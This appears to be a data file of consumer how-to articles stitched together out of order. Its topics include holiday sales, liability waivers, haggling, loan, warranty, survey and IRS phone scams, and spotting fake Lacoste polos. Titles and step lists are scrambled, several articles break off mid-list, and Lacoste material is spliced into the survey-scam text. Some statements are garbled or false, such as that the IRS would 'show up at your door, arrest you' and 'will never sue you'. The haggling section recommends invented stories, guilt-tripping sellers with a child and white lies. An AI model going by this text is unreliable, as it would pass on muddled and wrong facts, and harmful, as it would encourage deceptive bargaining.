, Many retailers have remained relevant to tech-savvy teenagers while amping up holiday excitement by using their social media accounts to announce and disseminate their post-holiday sales. No matter which platform you use, get your favorite retailer on your social media feed and stay up on the time-sensitive deals, coupon codes, and promotions.Twitter and Instagram are perhaps the most popular platforms for hip retailers, but you can also join a store’s Facebook group or give it a Like in order to receive updates on your laptop or smartphone.

, Some of the most jaw-dropping post-holiday sales can be tough to resist, but you should be 100% certain about your purchase if you don’t want to get stuck with a poor, impulse-driven decision. This is because many stores change their return policies around the holidays, making it more difficult to return a discounted item for credit or cash. Avoid this pricey pitfall by checking out holiday sale return and exchange policies ahead of time, and asking store employees or customer service reps to clarify any confusing contractual language. Even if your store accepts full-price returns, be sure to keep all the necessary documentation! Tuck your paper receipts in a safe place, and keep a separate folder for emailed order confirmations.

, If you’ve got good credit and know how to handle your money, consider opening a charge account at a store you love. Almost every store will offer 10-15% discounts on your first purchase, as well as points- or dollar-based reward programs to encourage consistent spending and customer loyalty. Just be sure to pay down your balance as quickly as possible, as many store cards carry a relatively high annual percentage rate (APR).Also be sure to check Black Friday-specific policies, as some stores don’t count regular credit card promotions toward or on top of this gargantuan sale.

Aim for televisions and electronics.,
Watch out for popular gifts that have been marked down.,
Buy marked down clothing.,
Watch out for bad sales.",How to Take Advantage of After Christmas Sales2," Stores often anticipate certain items will sell more during the holidays. Overstock items are often marked down at after Christmas sales. Overstock items often go fast, as they can be very marked down if the store needs to get rid of them, so aim to find these products first thing when you get to the store.Depending on the store, there may be a section dedicated to marked down overstock products.
Common overstock products include things like electronics, trendy gifts, clothing, and accessories.

, Electronics and television sets often do not sell as well as expected over the holidays. You may be able to get a variety of pricey electronic items at a very low price at an after Christmas sale.Remember to research brands before heading to the store. Very well known brands may not be marked down, but a lesser known brand can still be of decent quality.

, If an item was a popular gift choice over the holiday season, it may be on sale afterwards. Was there a popular gift that was out of your budget during the holiday season? You can probably find it marked down at an after Christmas sale. For example, if fitness watches were a popular Christmas gift, the prices may be slashed at an after Christmas sale.You may also be able to find popular gift items marked down online.

Check the clothing section in a department store to see if you can find marked down items here.If clothing itself is not marked down, accessories like jewelry may be marked down.

, Not all sales are worth going for. When choosing items to purchase, make sure you're really saving money. A marked down item for a poorly known brand, for example, may not be worth buying if a higher quality brand is only slightly more expensive.


You should also watch out for items marked down because they will be obsolete soon. For example, if a new version of gaming system or computer is coming out soon, don't bother buying an old version at a cheaper price.Only buy bulk items you'll really use.

Sign the waiver if it is required to participate.,
Read the waiver before signing.,
Try to negotiate.,
Show your lawyer the waiver.,
Keep a copy of the liability waiver.",How to Know if You Should Sign a Waiver of Liability1," Some organizations might not let you participate unless you sign a waiver of liability. In this situation, you face a choice: sign the waiver and participate or don’t sign the waiver and be prevented from participating.


Only you can make the choice. If you want to participate in the activity badly enough, then you should sign the waiver.;
, You should always read any waiver given to you to sign. Before deciding whether to sign it, you need to understand its purpose and what rights you are giving up. You should only sign a waiver if you agree and understand each of its provisions. Take out your waiver and look for the following common waiver provisions:


To relieve the organization of liability for your injury. The waiver might state that you agree to “hold harmless” the organization. Basically, the organization is trying to prevent you from suing it for your injuries.
To limit where you can bring the lawsuit. A waiver of liability might try to get you to agree to bring your lawsuit in only a certain court. The purpose of this provision is to protect the organization from having to go to a distant part of the country to defend itself.To force you to arbitrate an injury. Arbitration is a form of dispute resolution which is private. Instead of going to court, you agree to present your case to a private arbitrator. Some organizations might try to get you to agree to arbitrate any dispute that you have.

, You should ask if you can negotiate some of the terms of the waiver. You probably won’t be successful.Nevertheless, you should feel free to ask, particularly if there is only one provision you disagree with.


You could say, “I know you probably don’t negotiate these waivers, but would it be possible to remove the arbitration provision?” If the company agrees, then you and a manager can both initial the pages that are being changed and write in the revision.
If the business says no, then you are probably stuck either signing it or not participating in the activity.

, If you are unsure about signing the waiver, then a lawyer’s advice would be most helpful.A lawyer can review the waiver and make sure that you are not signing away valuable rights. A lawyer could also try to negotiate with the company on your behalf.


For everyday activities, like skiing or visiting an amusement park, you probably don’t have time to show the waiver to an attorney.
However, if you are signing a waiver related to an employment contract, then you should have enough time to review it with a lawyer.

, In the event you are injured, you will want to know precisely what the waiver said. After signing the waiver, ask the organization if you can have a copy.


Store it in a safe place at home, where you know that you can find it.

"
"
Don’t sign if the waiver isn’t required to participate.,
Refuse to sign if you don’t understand the waiver.,
Avoid signing a waiver after an accident.,
Refuse to be pressured into signing.",How to Know if You Should Sign a Waiver of Liability2," Before signing, you should ask if you need to sign. Some activities might require that you sign the waiver before you can participate. In a school setting, you might have to sign a waiver of liability as a parent in order for the school to let your child participate in an activity, such as sports or a field trip.


If you don’t have to sign, then there is no reason to sign a waiver.Maybe the organization has made the waiver optional. In this situation, you don’t need to sign.
Ask whoever is in charge if you have to sign the waiver and why.

, Since a waiver is a contract, you shouldn’t sign if you don’t understand the document.You don’t want to agree to a document unless you understand its terms.


Take your time reading the waiver and don’t feel rushed. It is illegal for the organization to try and coerce you into signing the waiver of liability.
If you don’t understand something, then ask for clarification.If the organization does not clarify what the language means, then don’t sign the waiver.
Also don’t assume that all waivers are the same. The fact that you signed a waiver last year when your daughter joined the swim club does not mean that the skiing club’s waiver is the same. Always read the waiver.

, If you or your child is injured, then you should not sign any kind of waiver or document. A company or insurer might shove a bunch of papers in front of you and ask for your signature. Among these papers could be a release from liability.Waivers should only be signed before participating in an activity, not after you are hurt. Do not sign any company or insurance documents after the injury.If you are injured and given papers to sign, immediately call a personal injury attorney. An attorney can advise you about your rights.
You can find a personal injury lawyer by contacting your state or local bar association. These organizations of attorneys should have referral programs.

, You might be gently told not to worry about the waiver or that you should sign it because “everything will be okay.” You should politely resist these efforts to pressure you.


For example, you could say, “I’m sure it’ll be okay, but I don’t think I need to sign it right now.”
Or you could say, “My lawyer will probably agree everything is fine. But I want to show her the document before signing it.”

Research your state law on liability waivers.,
Understand that a minor can void a waiver.,
Consult an attorney if you are injured.",How to Know if You Should Sign a Waiver of Liability3," Your state law determines whether a waiver is valid.Accordingly, you will need to research your state’s law on when a court will enforce a waiver of liability.


In North Carolina, for example, a waiver is generally enforceable. However, it will not be enforced if the company intentionally injured you or consciously disregarded a danger.
North Carolina also will not enforce a waiver if you signed it because of fraud or coercion.Other states are more hostile to waivers of liability than North Carolina. Louisiana, Montana, and Virginia all refuse to enforce waivers of liability.It may be difficult to find out the status of your state law. Court opinions are not easy to find. You can search the Internet for summaries of your state’s law. Alternately, you could meet with a lawyer, who can inform you of the current status of your law.

, If your child signed a waiver of liability, then he or she can generally cancel the waiver because minors cannot contract. In most states, someone younger than 18 is a minor who cannot form a valid contract.


In most states, parents also can’t waive their child’s negligence claim. Accordingly, even if an adult signs the waiver, the minor can cancel it anyway., Only a lawyer can advise you properly about whether you can sue someone if you signed a waiver. State law often changes, and you want the most up-to-date information.


You shouldn’t assume that because you signed a waiver you’ll never be able to get money from the company that injured you.A skilled attorney can make the case that your injury falls outside the coverage of the waiver.

Stay calm.,
Feign innocence.,
Try the butter wouldn't melt approach.,
Be prepared for story time.,
Tell them that you think you'll leave it because you've seen one a few quid cheaper only a few stalls down.,
Offer cash in hand.",How to Haggle and Win," When you ask the price of the item and think ""WHAT?!"" when they give you a price 10 times more than you're willing to pay, you need to try not to look too shocked. If you go for the whole ""That's ridiculous!"" approach, you won't get anywhere; you need to make the seller feel guilty, not angry.


If you make this mistake, apologize and move on. You've already shown your darker side, and the seller is likely to be somewhat wary of you.;
, You don't want the seller to see the cogs turning in your mind as you try to think of the best haggling approach. Try to widen your eyes very slightly as you feign slight shock at the price. Turn your mouth into either a small 'O' or a pursed line. Both of these show that you're uncomfortable with the price. The idea of wide eyes makes the seller feel slightly guilty, and if you even add a little ""uh?"" like a child having their toy taken away, you will seem like the innocent one and they will be squirming in their skin.

, If you have a child with you at the time, use this to your advantage. If it's the child that wants the item, then this is even better. Place a hand on the child's shoulder and say something similar to the following things:


""S/he only has £10 pocket money...!""
""But s/he doesn't have that much money left!""
""Honey, daddy doesn't have that much money... I'm sorry hun, the man won't go any cheaper...""
""Look at her/him....are you sure you won't do £5?"".

, Make up a quick story of what you would use the item for and all of the plans you had for it, and then say something along the lines of ""It's a bit expensive though...a shame really..."". You don't have to tell a real story; exaggerate and make it sound as if you are very keen to buy it but would never pay that much.

, Mention: ""I've seen cheaper elsewhere."" This can make them panic and think ""Oh no! I must lower the price, quickly!"" However, it can backfire if they're well aware that their competitors are closely aligning prices with theirs, and they'll smirk and wave you off in that direction.

, Get out a handful of cash. Make sure that you get out less than they are wanting, and flick through it as if counting.This has two benefits:


It makes the seller's mouth start watering for the money now that they can see it, and they will be more willing to take it at a lower price.
It shows them that you don't have as much as they want but are willing to pay money still. (Remember, a little white lie doesn't hurt anyone!).

Research any lender you are considering.,

Report scams to the proper authorities.",How to Avoid Loan Scams," There are a lot of fraudulent lenders on the market, so go into your search with extreme skepticism. You need a lot of hard evidence of a company's legitimacy before agreeing to do business with that company.Get the lender's phone number from an online source or the phone book and call to make sure they really are who they claim to be.
Ask for the lender's physical address and use that to search for reviews online. Don't do business with them if they refuse to give you an address.
Check with the Better Business Bureau (BBB) to see if the lender is registered in your state. If they are not, or have a poor BBB rating, avoid them.Search for the lender online. If others have fallen prey to a scam, odds are they have posted about it online.
Homeowners looking for help with mortgage payments should be particularly skeptical. A lot of fraudulent companies mimic government websites in order to lure victims, so do a lot of research when seeking out help for mortgage payments.
Always assume there's a possibility a company could be fraudulent before engaging in business with that company. Never assume a company is legitimate just because it claims affiliation with a particular agency. Research the company to make sure that connection is real.;
, Call your the Attorney General’s Office or your Department of Banking or Financial Regulation. Give them the name of the company you're working with, and ask if it's registered in your state. In the United States, lenders are required to be registered in the states where they conduct business. An unregistered lender is likely a scammer.If the lender is registered, look them up on the Better Business Bureau. Make sure they have a solid rating. Even if a lender is registered, they could still conduct scams. It is dangerous to work with a business with a lot of complaints filed against them.
You should also look up the company on the Federal Trade Commission's website. They can also provide you with information on a company's reputation and legitimacy.

, If you are searching for a mortgage lender, you should look for them on government-affiliated websites. You can gauge if a company is officially associated with the government based on its URL. Companies whose URL's end in "".gov"" are vastly more likely to be legitimate than other websites. Go for these companies when selecting a lender. The Making Home Affordable official website, as well as the website of Housing and Urban Development, both have a "".gov"" URL., The adage ""If it seems too good to be true, it probably is"" is particularly apt when dealing with lenders. You should not work with a company that offers quick and easy fixes to difficult financial issues.


Modifying a loan or stopping a foreclosure is a difficult process. There is never a guarantee that an attempt to do so will be successful. Therefore, companies that claim such promises are likely fraudulent.
""Money-back"" should also be avoided. Most legitimate companies do not charge for things like loan modifications, so there should be no need to get your money back.

, Such claims are often dubious. A lot of businesses make false claims of being government backed to look legitimate. Research companies who make these claims to make sure they are not fraudulent.


Your mortgage lender can tell you if you qualify for assistance through any government program. If you're looking for help from the government, go to your lender before seeking out outside companies.

, A company that asks for personal information up front is suspicious. A legitimate lender will understand most people are uncomfortable offering personal information over the phone, and should not pressure you to do so.You should only give personal information to companies you trust. Never give out personal information until you have made sure a company is legitimate.
The same holds true on the internet. Never give personal information over the internet unless you are sure the lender is legitimate and your connection is secure. Look for the green lock symbol in your browser's address bar. This means that your connection is secure.
Fraudulent companies may ask for things like bank account and credit card information, as well as information like your social security number. You should not give out information unless it's made clear why that information is necessary.

, Any legitimate company should have a physical office. When you ask for a physical location, a representative should have no trouble providing this information. If a company dodges questions about their physical location, do not work with this company., A legitimate company will need to see a credit report prior to making a deal with a client. A company that is going to lend you actual money will want some evidence you can repay them down the road. A company that is not worried about credit is probably fraudulent.Watch out for ads that say stuff like, ""Bad credit? No problem!"" You should also be suspicious of a company that promises to give out loans to anyone.
When meeting with a representative, expect to be asked about your credit history and asked to provide personal information so that a credit report can be obtained. Never supply personal information before being confident that the lender is legitimate.

, You should not have to pay an application fee when applying for a loan. Fraudulent companies are looking to get money out of people fast. One way to do this is to ask for an application fee.When meeting with a representative, ask if there is an application fee. If the answer is not ""No,"" you should look for a different company.
Companies often try to hide application fees by referring to them by different terms. For example, say you ask about an application fee and the agent replies, ""There is no application fee, but there is a small processing fee."" Understand a processing fee is more or less the same thing. You should find a different company.

, You can get a sense of a company's legitimacy based on the salesperson's tactics. Lenders make money off of the interest accrued on loans. They will want to know about a bit about you before signing an agreement. They will provide you with a variety of quotes and information on loan rates before following up later. Fraudulent lenders tend to be more high pressure. They are likely to want to pressure you into an agreement on the first meeting.A suspicious lender is likely to present you with application papers on the first meeting. They may pressure you to fill them out if you express hesitance, or ask for time to think it over.
A fraudulent lender will be trying to sell you something rather than help you pay off a loan. Instead of answering questions to assess whether their company meets your needs, they will try to convince to reach an agreement right away.

, Money wiring is almost always a bad sign. There are very strict mail fraud laws in the United States. To avoid government tracking, scammers will find other ways to gain access to your money. Under no circumstances should you work with a company that wants you to wire them money.Money wiring is very difficult to trace, especially money wired from one individual to another. Never wire money, as you could end up having your money stolen and be unable to track down the scammer.

, A legitimate lender will never want you to take over your mortgage or the title on your home. Companies will often advertise themselves as ""foreclosure rescuers"" and ask that you transfer your titles to them. A scammer will offer to buy your home and allow you to stay as a renter. However, as soon as you sign your title over to a scammer, they can evict you at any time., There are several items that a loan document should always include. For example, the following information should be clearly stated: loan amount, annual percentage rate (APR), repayment schedule, default provisions, and any other special conditions. If any important details are left out, you may be dealing with a scammer., You do not want to end up getting roped into a high interest loan, or a loan with hidden costs. Scammers may also stealthily put in a clause that transfers ownership. Take a few days to read an agreement thoroughly prior to signing.It may be a good idea to have a legal professional look over a document, especially if you're unfamiliar with legal documents.
Never sign anything you don't understand or that is conflict with the terms previously agreed upon.

, If you suspect a company is conducting a scam, report them. You have an obligation to prevent other people from falling victim to a loan scam.You should file a complaint with both the Federal Trade Commission, and the Internet Crime Complaint Center.
Contact a number of major credit reporting bureaus, and provide them the name of the fraudulent company.
If you gave over information to a fraudulent company, make sure to check your credit report, bank statements, and credit card statements regularly. You want to make sure a company is not spending your money.

Look for the company's main website.,
Find the ""about us"" page for the company.,
Consider the price tag of the item.,
Use a credible free stuff website.,
Avoid free stuff blogs.",How to Tell when Free Stuff Is a Scam," Most businesses offering free stuff are doing so to promote their website. If there is no main site then chances are the company does not exist and this could be a phishing scam.;
, If they have an address and phone number, cross reference those with online phone books and Google maps. Many times a ""business"" is located at a non-existent building or floor.

, Often times big ticket items are the perfect draw for scams. Especially if you have to ""complete partner offers"".

, There are many sites that offer free stuff. But websites that do this in a well rounded way often check the legitimacy of the freebies before posting them. That saves you a lot of the work.

, While they appear chock full of free stuff, they are often run by people with little knowledge of the web on the whole. These blogs account for the majority of scam free stuff getting spread around. This is because they feel pressured to post a new free thing everyday. This pressure and their daily journal style pushes them into offering often questionable freebies. The pressure is on when it comes to blog posts. Since they must have a free offer for that day, they feel a lot more pressure to post something that may not be real or is simply outdated. This means more scams and wasted time. It is also not uncommon to see a blog re-post an expired freebie to make you feel like you missed something that day, even though it was not available.

Identify high pressure sales techniques.,
Research the company.,
Hang up on the caller.",How to Spot Auto Warranty Scams1," A scammer might call you, send you a letter, or write an email. The scam is always the same: they claim that your warranty is about to expire and they offer to sell you an extension.Don’t be impressed by the details the scammer knows. For example, they might know the make, model, and year of your car. However, scammers can buy this information from websites. You might have provided this information when you shopped for auto insurance online.
Ideally, you shouldn’t do business with someone who contacts you. Instead, research companies thoroughly and then reach out to the ones you find are reputable.;
, Is your warranty about to expire? Check to make sure.Go through your paperwork and find it. If you can’t find the warranty, contact the manufacturer.Check the manufacturer’s number online or in the phone book. Don’t call the number provided on the letter, email, or postcard, since this might be a number created by the scammer.

, If you do talk to a scammer on the phone, they will try to pressure you into buying an extended warranty policy. For example, they might use the following techniques:


They tell you the deal is good for only one day.At the same time they claim you can cancel at any time. This type of technique is a huge red flag. Legitimate businesses do not try to pressure people into purchasing something by creating a sense of urgency.
They call day after day. This type of behavior, which borders on harassment, is a high-pressure sales technique.
They avoid showing you a sample contract.There’s no reason for a reputable company to hide this information.

, Scammers develop a reputation, and you can quickly find customer complaints by searching online. Look at the Better Business Bureau or do a general Google search.Look for complaints that the extended warranty didn’t cover what consumers thought it would.

, You might find it stressful to be hounded by someone employing high-pressure sales techniques. If so, remember that you can hang up on them. You aren’t obligated to do business with anyone, and it isn’t rude to say, “I’m sorry, I’m going to hang up.”


As a reminder, never share personal information with someone who has called you over the phone. For example, avoid sharing your credit card information, driver’s license number, or Social Security Number.If they call back, ask for the number to request that they stop calling you. Legitimate telemarketers are required to give you a number.

Before you begin bidding, make sure you understand as much as possible about how this particular auction site works and what your commitments and responsibilities as a buyer are.,

The top jaw is smaller than the bottom jaw and is angled upwards. The crocodile’s tail should be rounded and point in the same direction as the jaw, not at the crocodile. The eye should also look more slit-like than rounded.If the crocodile looks cartoonish and lacks detail, the shirt is a sure fake.
Lacoste’s Vintage brand is an exception. The crocodile will be high-quality but the same color as the shirt.;
, The logo is a patch that is lightly sewn on from behind. You won’t see the stitching when you look at it from the front. Look out for stitching around the patch’s border, loose threads, or needle hole marks. These are signs that the polo is a fake.On a few brands, such as the Vintage brand, the crocodile may be printed directly on the shirt.

, The crocodile will be in the middle of the left side of the shirt. It should be between the bottom stitching on the collar and the second button. Low-quality fakes often align the crocodile with the bottom stitching. That stitching may also appear crooked.A few real Lacoste versions also align the crocodile with the bottom stitching, so don’t depend on this one observation.

Do your best to avoid cramming scams.",How to Avoid Survey Scams4," Election survey scams are another innovation in the scammer's toolbox. Don't fall for them. They're really just a thinly veiled attempt to harvest your personal information.


In an election survey scam, the ""pollster"" claims to be administering a poll about an upcoming election or about a hot-button political issue. The major red-flag is that the pollster will offer you a prize like a vacation if you complete the survey. They ""only"" need your credit card information to credit you the money for the vacation.Not only is offering a prize to complete a poll likely to skew the results, no pollster could afford to compensate everyone who takes the poll to the tune of several hundred dollars.

, Oftentimes, a telephone survey scam will actually be composed of two steps. Since most consumers expect a scam to be one discrete event, these can be very tricky to spot.In a two step scam, the scammer calls your number asking to you take a quick survey. The survey will ask questions about spending habits and finances. If you subscribe to your local newspaper, for instance. Once you've completed the survey, the call ends.
It is only a week or two later that the scammer goes in for the kill. They'll call you up posing as a representative from the newspaper, claiming your subscription is about to expire. Then they get your payment information, completing the scam.

, A ""cramming"" scam occurs when your cellphone account is billed for numerous unauthorized charges. These can be among the most difficult to avoid, and the best course of action is to call your phone company and place restrictions on how new services (like ringtones and apps) can be billed to your account.In a cramming scam, the scammer is only calling to see if your phone-line is active and get basic personal information. They may ask you a few short survey questions to get your name and address, which is sometimes all they need to charge your account.

Above the crocodile, you should see a red number such as “4.” If the polo uses words like small, medium, or large, it is a fake., The crocodile should be an olive green color. Again, it will have noticeable claws, teeth, a red mouth, and white scales on its back. Make sure the crocodile’s outline looks smooth instead of lumpy. An authentic one also won’t have rough lines disrupting the coloring.High-quality fakes look similar, but study them closely. They won’t be quite as detailed. The crocodile may look a little squashed. The white eyes and scales tend to look rough and too close together.

, If the polo has a second tag, it’ll rest under the first one. The first line should say “Designed In France.” These words should not be covered up by the first tag. The second line will say “Made In” along with a country, which is usually El Salvador or Peru. Lacoste polos made in France are rare.

Not all polos have this second tag. Many polos now have a wide tag with the logo, so use other methods to identify them.

, The tag is on the bottom and inside the shirt. When you find it, you will first see “100% cotton” printed in seven languages. On the back, you’ll see washing instructions with the word Devanlay, which is the company’s name. No fabric should cover the letters on the tag.Fake shirts may have the washing instructions on the tag’s front. The tags may also be roughly sewn in with threads that hang down or obstruct letters.
The tag may be above small triangle cuts on the side of the shirt. Make sure these cuts are small and don’t have loose threads hanging from them.

, They may be selling things you should not be able to buy in your state or country. If you purchase them on the net, you should realize you can still be in trouble with the post office.

, Don’t be fooled by labels. If they have labels that say they are with a trustworthy group, check for yourself. Many put up stickers similar to putting a security sign in your yard when you have no security system in place.

, Do not give them your credit information until you check them out.

, That way, if you have a problem you have recourse and can get lots of personal references.

, Check everyone’s ID at the door.

, They may have a great web site, but send out someone you would not want in your home. Ask for the name of the person and do a search on the web for them. Remember that many names are common, so you need ages and locations. Also ask how long this person has been working for them.

Mail in a complaint.",How to Avoid Scams," A majority of scams follow similar types of fact patterns. This occurs because scammers know what works and what doesn't, and they try to scam you by doing what works best. First, scammers will use fear to try and get you to do something. For example, some scammers might say that a relative has been arrested and needs money. Second, scammers will try to rush you to make a decision quickly. The longer you think about what is happening, the more likely it is that you will not become a victim.;
, Just as scammers use common practices like fear and panic, they will also use the same scams over and over again. If you can learn what types of common scams are out there, it will be easier to identify them and avoid them. Scams can take place online, over the phone, through the mail, and even in person. The most common scams include:Advance fee scams, which occur when people tell you that you have won a lottery, or that you can invest in something, and all you have to do is pay a small fee upfront.
Charity scams, which occur when people tell you they are collecting money for some charitable cause. In reality, once you make a ""donation,"" the scammers keep the money for themselves.
Internal Revenue Service (IRS) scams, which occur when people tell you you owe money in taxes or that they need your personal information to make sure your taxes were filed properly. These people try to get money as well as personal information in order to steal your identity.
Phantom debt scams, which occur when people contact you pretending to be debt collectors. They will threaten you and tell you that you owe money that you do not really owe.

, Phishing scams occur when individuals contact you claiming there is a problem with some account you might have (e.g., credit card accounts and loan accounts). They will tell you they can fix the problem but they need to verify your personal information. Once they have your personal information, they use it to steal your identity.

, One of the best ways to keep up-to-date on recent scam schemes is to get government alerts. The Federal Trade Commission (FTC) offers an alert that is sent to your email periodically. The alert will give you tips and advice on how to avoid scams. If you want to sign up, you can do so through the FTC's website., Because some of the most common scams attempt to gain access to your personal information, one of the easiest ways to avoid scams is to protect that personal information. Keep passwords, account numbers, and sensitive paperwork in a safe place. Do not keep this information on your phone where it can be found.


In addition, do not leave your mail somewhere where scammers might be able to get ahold of it. If you can, have your mail deposited directly into your home, as opposed to a mailbox. If you have a mailbox, take your mail out as soon as possible.
If you get a solicitation asking you for your personal information, never willingly give it out. Take extra steps to ensure the solicitation is legitimate before you move forward., When you get mailings that ask for money or information, follow-up and do some research about the company or person asking for the information. Never assume a solicitation is legitimate. Try doing the following, which should help you avoid scams:Type the company's or product's name into an online search. Use words like ""complaint,"" ""review,"" or ""scam.""
Search using phrases and sentences that describe your situation. For example, if you got a call from someone claiming to be from the IRS, search for, ""IRS call asking for Social Security Number.""
Look up the phone number that was used to call you. When you type the number into an internet search engine, some of the top results will usually tell you whether that number has been used for scams before.

, In today's world, it is easy for scammers to manipulate caller IDs and phone numbers. Therefore, you should never trust the name and number as it shows up on your phone. If you get a phone call from someone, ask them for their name and the company they work for so you can call them back. Once you get off the phone, look up that company's information online and only call back legitimate numbers found on reputable websites.For example, assume you get a call from someone claiming to be from the IRS and they need some personal information. Instead of giving it to them right away, hang up the phone. Go online to the IRS's official website and find the customer service phone number. Call that number back and ask whether anyone would have called you asking for personal information.

, A lot of scammers will request money in exchange for a promise to send you more in return. Scammers will usually tell you that you have won a prize and that you need to pay taxes or fees in order to collect the prize. They might also ask you to pay in advance for a job, debt relief, or for loan assistance.


However, you should never pay any money upfront. Check the legitimacy of these programs and solicitations before giving anyone anything. In general, once you give these individuals money, you will not receive the service or product you were promised., Scammers will request money from specific sources in order to avoid detection. Most scammers will request cash, money wires (e.g., Western Union), or prepaid credit cards (e.g., Vanilla). These payment methods are difficult to track and nearly impossible to reverse. No legitimate company will ask you to pay using these methods.


Most legitimate companies will ask you to pay using credit cards and personal checks. These payment options offer built in fraud protection and give you the ability to cancel charges and withhold money., Before you give out your personal information or money, talk to someone you trust about what is going on. This could be friends, family, or professionals (e.g., a lawyer, a bank employee, or a government employee). Tell them about the solicitation and ask whether they have seen anything similar before.


Remember, scammers want you to move quickly without thinking. By stopping and talking to someone else, you are giving yourself a chance to avoid the scam., A lot of free trials will automatically turn into large monthly charges, and some trials will not even allow you to cancel for a certain period of time. Before you accept a free trial for things like television channels, weight loss supplements, or anything else, make sure you look over the company's cancellation policy.


A lot of company's will allow you to cancel at any time. However, these companies might continue to charge you until you dispute the charges with your bank.
In addition, a lot of company's will only give you the free trial if you agree to purchase more of the product or service at the end of the trial.
If you accepted a free trial of something, make sure you cancel in a timely manner and check your bank accounts regularly for suspicious charges., A lot of scammers will offer you a large amount of money by check if you send a smaller amount of money in cash or through a wire. However, the check you receive will usually be fake. While a bank may accept the check upfront, it will always be uncovered as fake at some point. When that time comes, it will be your responsibility to repay the bank.


Therefore, never accept a check from someone you don't know without first checking it out., If you gave out your personal information or gave a scammer money, you will want to report the scam to the proper authorities. When you contact various reporting agencies, they will want to look over any evidence you have regarding the scam. Therefore, if you received any suspicious mailings, got any voicemails, or were handed any paperwork in person, keep it.


This information will help identify the source of the scam and what they are attempting to do.

, In addition to keeping documents you received, you will also want to take your own notes of what is happening. These notes will help you remember details when it comes time to report, and it will help you describe the scam accurately. For example, if you contacted someone regarding the scam, write down who you contacted, what you talked about, how long the conversation was, and what the outcome of that conversation was. If someone called you asking for money or personal information, write down the number they called from, who they said they were, and what they asked for.

, If you have friends or family who witnessed the scam take place, or who have seen the emails or other solicitations, ask them to write a brief statement about what they saw. These statements can help back up your story and provide additional information that you may have missed. Additionally, if you know others who were victims of the same scam you were, ask them to report the scam with you. The more people you can get to join you, the more seriously your complaints will be taken.

, If you have been scammed and you gave out personal information or money, the first thing you need to do is contact your local police department.The police department will be able to do the most for you personally, because they will investigate if a crime occurred and attempt to get your money back.


When you contact the police, they will want as many details as possible to help them investigate the scam. Provide them with your notes and any documents you received throughout the scam's life.

, The BBB is a resource consumers use to look up common scams and scams that have happened recently. When you file a report with the BBB Scam Tracker, you will not receive an individual response. The Scam Tracker allows you to tell your story so others might be able to avoid the trap you fell into. To file a Scam Tracker Report, visit the BBB's Scam Tracker website. They will ask you for the following information:Information about the scammer (e.g., the business's name, the person's name, their phone number, their website)
Information about the scam (e.g., how you were contacted, what was being asked for, what did they say happened, whether you lost money)
Your personal information (e.g., your age, where you live, your name)
Attachments of things you received from the scammer

, Email or call your friends and tell them what happened to you. In doing so, you can help others avoid scams and possibly find people who received the same scam information as you did. As word spreads, you might get information about who is responsible, what others did to report the fraud, and what could possibly be done as a group to help catch who is responsible.

, While most agencies will not be able to help you individually, any information you provide in a complaint is used to track scammers and take action against them. The agency you contact will depend on the scam you were a victim of. Some examples of common scams and who you would contact to report them include:Most types of fraud - contact the FTC.Mail fraud - contact the U.S. Postal Inspection Service.Identity theft - contact the FTC.Bank fraud - contact the Financial Fraud Enforcement Task Force., Using the information you found while tracking down possible government contacts, you need to visit the agency's website and determine how a complaint can be filed and what information you will need to provide. For example, if you want to file a complaint for most general types of fraud (e.g., a lottery scam or a gift scam), you would visit the FTC's Complaint Assistant website. From there you can read about the types of scams they cover, how you can report a scam, and how your complaint will be handled.Use this information to determine how you want to proceed and file your complaint.

, Most agencies will allow you to file a complaint quickly and easily online. Each agency will proceed differently and each agency will ask for different information. Follow the directions on each website to successfully submit your complaint. For example, if you use the FTC's Complaint Assistant, you can file a scam complaint by doing the following:Selecting a category of scam you were the victim of (e.g., identity theft, scams and rip-offs, credit and debt)
Clicking a sub-category of scam (e.g., counterfeit checks, imposter scams, prizes and lottery scams, romance scams)
Telling the FTC how you were contacted (e.g., over the phone, in person, through the mail)
Detailing the scam (e.g., how much were you asked to pay, how much did you pay, how did you pay, how did you respond to contacts, did you try to contact the scammers)
Providing information about the company or person that scammed you (e.g., their name, address, phone number)
Giving the FTC your information so you can be contacted if the FTC wants more information

, A lot of agencies will allow you to report a scam over the phone if you do not have regular access to the internet. You can find the agency's phone number online or by asking someone with access to the internet. For example, if you need to report mail fraud, you can contact the U.S. Postal Inspection Service at 1-877-876-2455. Once prompted, you can press ""4"" to report the fraud.When you file a complaint over the phone, you will give the agency information very similar to that you would give them using the internet.

, If you prefer sending a hard copy through the mail, most agencies will offer it as an option. This could be useful when you have documents and solicitations that you would like the agency to have. For example, if you want to file a complaint with the U.S. Postal Inspection Service, you can mail a letter that contains information similar to that you would provide online. In addition, if you have other documents, make sure you attach them to your letter.


You will then be able to mail the complaint to the address provided, which for the U.S. Postal Inspection Service, is the ""Criminal Investigations Service Center, Attn: Mail Fraud, 222 S. Riverside Plz, Suite 1250, Chicago, IL, 60606-6100."""

Listen for phony excuses.,
Realize the phone number they're calling from is not the number of the IRS.,
Realize the scare tactics the scammers tell you is not under the real IRS's authority: The scammers will often get you to pay up fast by threatening to have you arrested, take away your drivers license (or business license), get you kicked out of the country, etc.,

Hold firm in ignoring them.,
Do not wire any money.,
Hang up as soon as possible.,
Warn your friends.",How to Deal with an IRS Phone Scammer," The Internal Revenue Service will contact you by mail if there's a problem, never by telephone, e-mail, or text message. They will also never call to demand immediate payment using a specific payment method such as a prepaid debit card, gift card or wire transfer, threaten to immediately bring in local police or other law-enforcement groups to have you arrested, threaten to take your drivers license, or do any of the many other tactics scammers take advantage of.

Furthermore, if you did owe money, you would first get a bill in the mail and told that the only way you'd be able to pay is by check, made payable to the US Treasury.;
, They would just simply show up at your door, arrest you and take you to the police station. You should also realize that the IRS will never sue you for any reason whatsoever as this is something that's not under their authority., If they try to pressure you to give your name, address or alternate phone number, just hang up. If you do, scammers might use the information you provide them and use that to commit forms of identity theft, such as filing a fake tax return in your name or committing identity theft in your name.

Besides, if they're really from the IRS, wouldn't it seem unusual if you're being asked for personal information when they ""should"" already know this because of your tax returns?

, Sometimes, they may say they've audited your recent return, or taken a look at your tax files and claim you owe back taxes or they'll claim there's a problem on the return.

Either way, they may tell you that you owe a specific amount of money (sometimes it could be a very hefty fine). They won't mention, however, your right to appeal such a decision.

Think twice before sending money.,
Determine the legitimacy of entry fees.,
Examine contest rules to determine if the sponsor is really a vanity publisher in disguise.,
Avoid entering a writing contest if the prize consists of “winning” a place in a writing seminar or writing conference, especially if you will ultimately be required to pay a fee to attend.

,
Look for the red flags that tell you a contest is a scam:


Does the sponsor publish the names and works of previous winners?,
Make sure all prizes are awarded.,
